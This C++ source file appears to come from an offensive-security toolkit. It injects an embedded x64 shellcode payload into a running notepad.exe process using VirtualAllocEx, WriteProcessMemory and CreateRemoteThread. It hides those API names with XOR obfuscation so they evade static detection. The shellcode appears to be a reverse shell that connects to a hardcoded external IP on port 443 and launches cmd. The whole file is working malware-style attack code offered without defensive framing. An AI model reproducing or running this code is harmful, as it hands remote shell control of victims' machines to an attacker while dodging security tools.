#include "utils.h"
#include "process_injection_api_obfuscation.h"
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>


typedef LPVOID(WINAPI* VAExType)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef BOOL(WINAPI* WPMType)(HANDLE  hProcess, LPVOID  lpBaseAddress, LPCVOID lpBuffer, SIZE_T  nSize, SIZE_T* lpNumberOfBytesWritten);
typedef HANDLE(WINAPI* CRTType)(HANDLE hProcess, LPSECURITY_ATTRIBUTES  lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, DWORD lpThreadId);

void XOR(unsigned char* data, size_t data_len, const char* key, size_t key_len) {
    int j = 0;
    for (size_t i = 0; i < data_len; i++) {
        if (j == key_len) j = 0;
        data[i] = data[i] ^ key[j];
        j++;
    }
}
LPCSTR DAndP(unsigned char* encoded, size_t len, const char* key, size_t key_len) {
    char* decoded = new char[len + 1];
    memcpy(decoded, encoded, len);
    XOR(reinterpret_cast<unsigned char*>(decoded), len, key, key_len);
    decoded[len] = '\0';
    return decoded;

}

unsigned char sc[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
"\x00\x49\x89\xe5\x49\xbc\x02\x00\x01\xbb\xcf\x94\x43\x6b"
"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";


unsigned int sc_len = sizeof(sc);
const char* key = "offensivepanda";
size_t k_len = strlen(key);

void processInjectionAPIObfuscation() {
	const wchar_t* targetProcess = L"notepad.exe"; // Target process name
	DWORD pid = GetProcessIdByName(targetProcess);

	if (pid == 0) {
		std::wcerr << L"Target process not found." << std::endl;
		return;
	}

	std::wcout << L"Target process ID: " << pid << std::endl;

	HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
		FALSE, pid);

	if (!hProcess) {
		std::wcerr << L"Failed to open process. Error: " << GetLastError() << std::endl;
		return;
	}


	HMODULE library = GetModuleHandle(L"kernel32.dll");
	unsigned char sVAEx[] = { 0x39, 0x0f, 0x14, 0x11, 0x1b, 0x12, 0x05, 0x37, 0x09, 0x1c, 0x0e, 0x0d, 0x21, 0x19 };
	unsigned char sWPM[] = { 0x38, 0x14, 0x0f, 0x11, 0x0b, 0x23, 0x1b, 0x19, 0x06, 0x15, 0x12, 0x1d, 0x29, 0x04, 0x02, 0x09, 0x14, 0x1c };
	unsigned char sCRT[] = { 0x2c, 0x14, 0x03, 0x04, 0x1a, 0x16, 0x3b, 0x13, 0x08, 0x1f, 0x15, 0x0b, 0x30, 0x09, 0x1d, 0x03, 0x07, 0x01 };
	LPCSTR A = DAndP(sVAEx, sizeof(sVAEx), key, k_len);
	LPCSTR B = DAndP(sWPM, sizeof(sWPM), key, k_len);
	LPCSTR C = DAndP(sCRT, sizeof(sCRT), key, k_len);

	VAExType pVAEx = (VAExType)GetProcAddress(library, (LPCSTR)A);
	WPMType pWPM = (WPMType)GetProcAddress(library, (LPCSTR)B);
	CRTType pCRT = (CRTType)GetProcAddress(library, (LPCSTR)C);


	// Allocate a memory buffer for payload with permission RWX
	LPVOID remoteMemory = pVAEx(hProcess, 0, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (!remoteMemory) {
		std::wcerr << L"Failed to allocate memory in target process. Error: " << GetLastError() << std::endl;
		CloseHandle(hProcess);
		return;
	}

	// copy payload to allocated buffer using WriteProcessMemory()
	if (!pWPM(hProcess, remoteMemory, sc, sc_len, NULL)) {
		std::wcerr << L"Failed to write shellcode to target process. Error: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return;
	}

	// run shellcode
	HANDLE hthread = pCRT(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMemory, NULL, 0, NULL);

	if (!hthread) {
		std::wcerr << L"Failed to create remote thread. Error: " << GetLastError() << std::endl;
		VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
		CloseHandle(hProcess);
		return;
	}

	std::wcout << L"Remote thread successfully created." << std::endl;

	// Wait for the thread to finish execution
	WaitForSingleObject(hthread, INFINITE);

	// Clean up
	CloseHandle(hthread);
	VirtualFreeEx(hProcess, remoteMemory, 0, MEM_RELEASE);
	CloseHandle(hProcess);

	std::wcout << L"Shellcode executed and resources cleaned up." << std::endl;
}